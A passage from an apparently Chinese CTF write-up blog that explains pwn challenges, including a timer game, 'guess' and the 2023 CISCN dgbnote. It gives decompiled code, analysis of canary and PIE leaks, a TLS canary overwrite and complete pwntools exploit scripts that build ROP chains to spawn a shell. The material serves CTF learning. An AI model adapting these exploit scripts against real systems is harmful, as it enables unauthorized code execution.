[rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v9 = <span class="number">31137.31337</span>;</span><br><span class="line">  ask_name(argc, argv, envp);</span><br><span class="line">  v8 = ask_number();</span><br><span class="line">  v3 = alloca(<span class="number">16</span> * ((<span class="number">8</span> * v8 + <span class="number">30</span>) / <span class="number">0x10</span>));</span><br><span class="line">  v10 = <span class="number">16</span> * ((&amp;v6 + <span class="number">7</span>) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">    *(<span class="number">8LL</span> * i + v10) = <span class="number">0x40DE68540E410B63</span>LL;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-=-=-=-= CHALLENGE %03d =-=-=-=-\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">    v4 = (<span class="number">8LL</span> * i + v10);</span><br><span class="line">    play_game();</span><br><span class="line">    *v4 = <span class="number">0x40DE68540E410B63</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v8 - <span class="number">1</span> || !ask_again() )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt; *(<span class="number">8LL</span> * i + v10) )</span><br><span class="line">      v9 = *(<span class="number">8LL</span> * i + v10);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-=-=-=-= RESULT =-=-=-=-&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, name);</span><br><span class="line">  HIBYTE(v6) = HIBYTE(v9);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Best Score: %lf\n&quot;</span>, v9);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的逻辑就是利用gettimeofday来实现一个控制时间的小游戏 输入想要间隔的时间 然后两次输入任意字符来开启和终止计时 不过程序本身并没有漏洞 漏洞主要出现在完成一次游戏后 是否还要继续的函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 <span class="title function_">ask_again</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Play again? (Y/n) &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v1);</span><br><span class="line">  readuntil(<span class="number">10LL</span>);</span><br><span class="line">  <span class="keyword">return</span> v1[<span class="number">0</span>] != <span class="number">110</span> &amp;&amp; v1[<span class="number">0</span>] != <span class="number">78</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在了一个栈溢出漏洞 但是由于程序本身开启了canary 所以我们需要想办法获取canary的值 这里当然是特别关注一下程序的几个输出函数 看看有没有机会泄露</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032100916.png" title="image-20230703210052881" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032100916.png" alt="image-20230703210052881"></a></p><p>发现了这个printf函数的调用存在可疑点 其将rbp-0x48处的内容赋值给了rbp-0x58 我们通过gdb动调来查看一下</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032102026.png" title="image-20230703210238001" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032102026.png" alt="image-20230703210238001"></a></p><p>可以看到相当于就是把canary赋值给了rsp指针指向的下一个字长处 这样的用意何在呢 可以看到随后就被赋值给了xmm0浮点数寄存器 这是printf函数利用%lf格式化字符输出数据的固定调用格式 会把调用时rsp的下一个字长内容输出</p><p>只要我们在ask_time函数中输入的v4不符合指定格式 那么v4就不会被赋值 从而我们可以泄露出canary 在后续的栈溢出中构造rop链</p><p>同时还有一点要注意的 由于是scanf引起的栈溢出 所以\x20 也就是空格 是无法被读入的 而本题的got表都位于0x602000处 所以我们需要泄露libc_start_main的基址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032142403.png" title="img" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032142403.png" alt="img"></a></p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;123.127.164.29&quot;,27917)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.binary = elf</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Time[sec]: &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x40099F&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Stop the timer as close to &quot;</span>)</span><br><span class="line">t = io.recvuntil(<span class="string">&quot; &quot;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">canary = struct.pack(<span class="string">&quot;&lt;d&quot;</span>, <span class="built_in">float</span>(t))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Press ENTER to start / stop the timer.&quot;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Timer started.&quot;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Play again? (Y/n) &quot;</span>)</span><br><span class="line">puts_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = <span class="number">0x601ff0</span></span><br><span class="line">rdi_addr = <span class="number">0x0000000000400e93</span></span><br><span class="line">ret_addr = <span class="number">0x00000000004006a6</span></span><br><span class="line">back_addr = <span class="number">0x40089B</span></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">rop.puts(elf.got.__libc_start_main)</span><br><span class="line">rop.ask_again()</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+canary+cyclic(<span class="number">0x8</span>)+p64(rdi_addr)+p64(libc_start_main_got)+p64(puts_plt)+p64(back_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x400916&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x23fc0</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Play again? (Y/n) &quot;</span>)</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;system_addr :&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+canary+cyclic(<span class="number">0x8</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4008DB&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h2><p>这题的漏洞点和上题类似 不过考到了pthread_join线程函数带来的漏洞</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032158886.png" title="image-20230703215820845" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032158886.png" alt="image-20230703215820845"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+Ch] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">pthread_t</span> newthread[<span class="number">3</span>]; <span class="comment">// [rsp+10h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  newthread[<span class="number">2</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_13E8();</span><br><span class="line">  v7 = sub_1594();</span><br><span class="line">  v3 = <span class="number">16</span> * ((<span class="number">8LL</span> * v7 + <span class="number">23</span>) / <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( &amp;i != (&amp;i - (v3 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL)) )</span><br><span class="line">    ;</span><br><span class="line">  v4 = alloca(v3 &amp; <span class="number">0xFFF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &amp; <span class="number">0xFFF</span>) != <span class="number">0</span> )</span><br><span class="line">    *(&amp;i + (v3 &amp; <span class="number">0xFFF</span>) - <span class="number">8</span>) = *(&amp;i + (v3 &amp; <span class="number">0xFFF</span>) - <span class="number">8</span>);</span><br><span class="line">  newthread[<span class="number">1</span>] = <span class="number">16</span> * ((newthread + <span class="number">7</span>) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">  sub_1552(a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_4030; ++i )</span><br><span class="line">    sub_1485();</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I don&#x27;t think you won the game if you made it until here ...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But maybe a threaded win can help?&quot;</span>);</span><br><span class="line">  pthread_create(newthread, <span class="number">0LL</span>, start_routine, <span class="number">0LL</span>);</span><br><span class="line">  pthread_join(newthread[<span class="number">0</span>], <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的逻辑都差不多 关键在于sub_1485这个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dword_4030 - <span class="number">1</span> == dword_402C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Sorry, that was the last guess!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You entered %lu but the right number was %lu\n&quot;</span>, v1, v2);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果这是我们最后一次猜数字并且还猜错了 那么就会告诉我们正确的数字 注意了是用%lu输出的 来看一下汇编 会将rbp-0x18处的数据赋值给rsi寄存器 我们通过gdb动调来观察一下 如果我们不按要求输出数据 使得我们输入的数据为空 此时的rsi寄存器会被赋值成什么</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032200069.png" title="image-20230703220038033" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032200069.png" alt="image-20230703220038033"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032204015.png" title="image-20230703220402973" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032204015.png" alt="image-20230703220402973"></a></p><p>可以泄露elf的地址 由于开启了PIE 我们在不泄露libc地址的情况下很难构造rop链 这下子就可以构造了</p><p>接着我们来说说pthread_create这个线程函数 其无非就是创建了一个新的线程 并且指定了新的线程从start_routine函数开始</p><p>随后利用pthread_join函数 指定了在原本的线程结束后 开始执行新的线程</p><p>在这里你可以注意到 两个函数的第一个参数newthread 是用来规定新线程的内存单元 也就是说新线程的内存空间是旧线程的栈</p><p>而栈地址我们知道是由高地址到低地址的 TLS结构体的初始化 就会在高地址处  而start_routine函数提供了栈溢出的机会 那么我们就有机会溢出到tls结构体  由此里绕过canary 再加上我们前面泄露了elf的基址 接下来就是ret2libc的问题了</p><p>旧线程的栈地址: </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032218769.png" title="image-20230703221821725" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032218769.png" alt="image-20230703221821725"></a></p><p>新线程的栈地址 以及tls结构体存放的位置</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032219847.png" title="image-20230703221924790" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032219847.png" alt="image-20230703221924790"></a></p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;123.127.164.29&quot;,27917)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter the size : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter the number of tries : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter your guess : &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1507)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x16E0)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;You entered &quot;</span>)</span><br><span class="line">elf_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot; &quot;</span>,drop = <span class="literal">True</span>),<span class="number">10</span>)-<span class="number">0x1579</span></span><br><span class="line">success(<span class="string">&quot;elf_addr :&quot;</span>+<span class="built_in">hex</span>(elf_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;But maybe a threaded win can help?&quot;</span>)</span><br><span class="line">puts_got = elf_addr + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf_addr + elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_addr = elf_addr+<span class="number">0x0000000000001793</span></span><br><span class="line">back_addr = elf_addr + <span class="number">0x1436</span></span><br><span class="line">ret_addr = elf_addr + <span class="number">0x000000000000101a</span></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x100</span>)+cyclic(<span class="number">0x8</span>)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(back_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x858</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">rax_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>)))</span><br><span class="line">rsi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>)))</span><br><span class="line">syscall_addr = read_addr + <span class="number">0x10</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x100</span>)+cyclic(<span class="number">0x8</span>)+p64(rax_addr)+p64(<span class="number">59</span>)+p64(rdi_addr)+p64(binsh_addr)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(syscall_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1484)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>2023Ciscn-dgbnote详解</title>
    <link href="http://example.com/2023/06/26/2023Ciscn-dgbnote%E8%AF%A6%E8%A7%A3/"/>
    <id>http://example.com/2023/06/26/2023Ciscn-dgbnote%E8%AF%A6%E8%A7%A3/</id>
    <published>2023-06-26T04:32:38.000Z</published>
    <updated>2023-09-14T17:17:31.172Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>2023Ciscn华东南分区赛遇到的一题 觉得题目的考点非常新颖和有趣 所以打算仔细研究一下</p><h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><p>题目用到了singal函数  该函数可以捕捉对应的信号 并且调用指定的信号处理函数</p><p>来看一下题目中所涉及到的两个single函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">signal(<span class="number">6</span>, handler);</span><br><span class="line">signal(<span class="number">14</span>, my_exit);</span><br></pre></td></tr></table></figure><p>第一个参数代表的是产生的信号 这里的6是SIGABRT 当进程非正常终止 调用abort函数的时候会触发</p><p>14是SIGALRM 如果程序设置的alarm函数超时 就会触发</p><p>下面是截取网上的大部分信号表格及其描述</p><table><thead><tr><th><strong>Signal</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>SIGABRT</td><td>由调用abort函数产生，进程非正常退出</td></tr><tr><td>SIGALRM</td><td>用alarm函数设置的timer超时或setitimer函数设置的interval timer超时</td></tr><tr><td>SIGBUS</td><td>某种特定的硬件异常，通常由内存访问引起</td></tr><tr><td>SIGCANCEL</td><td>由Solaris Thread Library内部使用，通常不会使用</td></tr><tr><td>SIGCHLD</td><td>进程Terminate或Stop的时候，SIGCHLD会发送给它的父进程。缺省情况下该Signal会被忽略</td></tr><tr><td>SIGCONT</td><td>当被stop的进程恢复运行的时候，自动发送</td></tr><tr><td>SIGEMT</td><td>和实现相关的硬件异常</td></tr><tr><td>SIGFPE</td><td>数学相关的异常，如被0除，浮点溢出，等等</td></tr><tr><td>SIGFREEZE</td><td>Solaris专用，Hiberate或者Suspended时候发送</td></tr><tr><td>SIGHUP</td><td>发送给具有Terminal的Controlling Process，当terminal被disconnect时候发送</td></tr><tr><td>SIGILL</td><td>非法指令异常</td></tr><tr><td>SIGINFO</td><td>BSD signal。由Status Key产生，通常是CTRL+T。发送给所有Foreground Group的进程</td></tr><tr><td>SIGINT</td><td>由Interrupt Key产生，通常是CTRL+C或者DELETE。发送给所有ForeGround Group的进程</td></tr><tr><td>SIGIO</td><td>异步IO事件</td></tr><tr><td>SIGIOT</td><td>实现相关的硬件异常，一般对应SIGABRT</td></tr><tr><td>SIGKILL</td><td>无法处理和忽略。中止某个进程</td></tr><tr><td>SIGLWP</td><td>由Solaris Thread Libray内部使用</td></tr><tr><td>SIGPIPE</td><td>在reader中止之后写Pipe的时候发送</td></tr><tr><td>SIGPOLL</td><td>当某个事件发送给Pollable Device的时候发送</td></tr><tr><td>SIGPROF</td><td>Setitimer指定的Profiling Interval Timer所产生</td></tr><tr><td>SIGPWR</td><td>和系统相关。和UPS相关。</td></tr><tr><td>SIGQUIT</td><td>输入Quit Key的时候（CTRL+\）发送给所有Foreground Group的进程</td></tr><tr><td>SIGSEGV</td><td>非法内存访问</td></tr><tr><td>SIGSTKFLT</td><td>Linux专用，数学协处理器的栈异常</td></tr><tr><td>SIGSTOP</td><td>中止进程。无法处理和忽略。</td></tr><tr><td>SIGSYS</td><td>非法系统调用</td></tr><tr><td>SIGTERM</td><td>请求中止进程，kill命令缺省发送</td></tr><tr><td>SIGTHAW</td><td>Solaris专用，从Suspend恢复时候发送</td></tr><tr><td>SIGTRAP</td><td>实现相关的硬件异常。一般是调试异常</td></tr><tr><td>SIGTSTP</td><td>Suspend Key，一般是Ctrl+Z。发送给所有Foreground Group的进程</td></tr><tr><td>SIGTTIN</td><td>当Background Group的进程尝试读取Terminal的时候发送</td></tr><tr><td>SIGTTOU</td><td>当Background Group的进程尝试写Terminal的时候发送</td></tr><tr><td>SIGURG</td><td>当out-of-band data接收的时候可能发送</td></tr><tr><td>SIGUSR1</td><td>用户自定义signal 1</td></tr><tr><td>SIGUSR2</td><td>用户自定义signal 2</td></tr><tr><td>SIGVTALRM</td><td>setitimer函数设置的Virtual Interval Timer超时的时候</td></tr><tr><td>SIGWAITING</td><td>Solaris Thread Library内部实现专用</td></tr><tr><td>SIGWINCH</td><td>当Terminal的窗口大小改变的时候，发送给Foreground Group的所有进程</td></tr><tr><td>SIGXCPU</td><td>当CPU时间限制超时的时候</td></tr><tr><td>SIGXFSZ</td><td>进程超过文件大小限制</td></tr><tr><td>SIGXRES</td><td>Solaris专用，进程超过资源限制的时候发送</td></tr></tbody></table><h2 id="readlink"><a href="#readlink" class="headerlink" title="readlink"></a>readlink</h2><p>该函数用于获取当前程序的绝对路径</p><p>其一共有三个参数 第一个参数代表一个符号链接 第二个参数代表要存储的空间 第三个参数代表多少字节</p><p>而&#x2F;proc&#x2F;self&#x2F;exe指向当前程序的绝对路径 所以原题中的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">readlink(<span class="string">&quot;/proc/self/exe&quot;</span>, v2, <span class="number">0x4F</span>uLL);</span><br></pre></td></tr></table></figure><p>就相当于获取当前程序的绝对路径 并且存储到v2内存空间中</p><h2 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h2><p>配合上面我们得到v2中存储的是当前程序的绝对路径</p><p>题目中的这一行 相当于就是重新运行了程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(v2, *&amp;buf[<span class="number">56</span>], *&amp;buf[<span class="number">48</span>]);</span><br></pre></td></tr></table></figure><p>第二个和第三个参数用来规定新线程中的argv和envp参数</p><h2 id="argv"><a href="#argv" class="headerlink" title="argv"></a>argv</h2><p>简单来说 argv就是传入main函数的参数数组 其中argv[0]是程序名 本题中main函数一开就对argv的参数做了检测</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v4 = a2[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;dbg&quot;</span>) )</span><br><span class="line">    sub_1B70();</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v4, <span class="string">&quot;run&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果为dbg 那么就可以进入sub_1b70函数 这个函数中存在任意写的机会</p><p>而如果程序的argv[1]参数不是run 就会终止程序 在远程环境中 默认就是以run为参数运行的程序 在我们本地复现的时候 需要注意手动加上参数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041501580.png" title="image-20230704150138479" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041501580.png" alt="image-20230704150138479"></a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io = process([<span class="string">&quot;./pwn&quot;</span>,<span class="string">&#x27;run&#x27;</span>])</span><br></pre></td></tr></table></figure><h2 id="envp"><a href="#envp" class="headerlink" title="envp"></a>envp</h2><p>envp是main函数的第三个参数 用来存储环境变量的指针 而有这样一个环境变量 LD_DEBUG&#x3D;all</p><p>其原本是用来查看链接库的情况 从而诊断报错 但是其在输出一系列信息的同时 会顺带输出libc地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041527228.png" title="image-20230704152739137" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041527228.png" alt="image-20230704152739137"></a></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>到此为之 题目的核心考点其实比较明了了  就是利用信号14的handler函数来重新启动程序  并且我们可以控制argv的参数 使其为dbg 我们就可以进入漏洞函数</p><p>为了实现这一点 我们需要触发abort 而本题开启了canary 并且在输入index或者是size时 存在了单字节的溢出 可以覆盖到canary的最后一个字节 那么当check触发时 调用__stack_chk_fail函数时 其内部会通过libc_message函数来输出报错信息 其中就会调用到abort函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041513529.png" title="image-20230704151349487" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307041513529.png" alt="image-20230704151349487"></a></p><p>但是还有一个问题我们没有办法解决 虽然dgb函数中给了我们任意地址读和任意地址写的功能 但是开启了PIE保护的情况下 